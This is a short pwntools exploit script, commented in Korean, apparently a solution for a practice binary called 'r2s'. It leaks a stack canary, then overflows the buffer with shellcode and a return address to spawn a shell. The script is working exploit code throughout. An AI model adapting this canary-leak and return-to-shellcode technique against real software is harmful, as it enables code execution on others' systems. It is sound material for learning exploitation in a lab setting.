from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)])) # n: hex(m)
# success(): 성공했을 시 로그 출력 

p = process('./r2s')

context.arch = 'amd64'

## [1] Get information about buf

p.recvuntil(b'buf: ')
bufAddr = int(p.recvline()[:-1], 16) # int(A, B): B진수로 표현된 A를 int type로 변환해 return
slog('Address of buf', bufAddr)

p.recvuntil(b'$rbp: ')
bufAddr2sfpAddr = int(p.recvline().split()[0])
bufAddr2cnryAddr = bufAddr2sfpAddr - 8 # ∵ canary <=> SFP: 8 byte
# r2s.c에서의 char buf[0x50]; 때문에 bufAddr2cnryAddr을 당연히 0x50이라고 생각할 수 있지만, 실제로는 dummy가 포함될 수 있으므로 직접 구해봐야 정확함.
slog('buf <=> sfp', bufAddr2sfpAddr)
slog('buf <=> canary', bufAddr2cnryAddr)

## [2] Leak canary value

payload = b'A' * (bufAddr2cnryAddr + 1) # 쓰레기 값. +1 is because of the first null-byte
p.sendafter(b'Input:', payload)

p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7)) # u64(): int type로 변환해줌. b"\x00\x00\x00\x00\x78\x56\x34\x12" --> 0x1234567800000000
slog('Canary', cnry)

## [3] Exploit

sh = asm(shellcraft.sh()) # asm(): 어셈블리코드 --> 바이트코드
# shellcraft: shellcode 생성 module
payload = sh.ljust(bufAddr2cnryAddr, b'A') + p64(cnry) + b'B' * 0x8 + p64(bufAddr)
# "banana".ljust(20, "O")는 bananaOOOOOOOOOOOOOO
p.sendlineafter(b'Input:', payload) # b'Input:'이 출력될 시 payload + '\n' 입력 (<-> sendafter(): payload 입력)

p.interactive()
 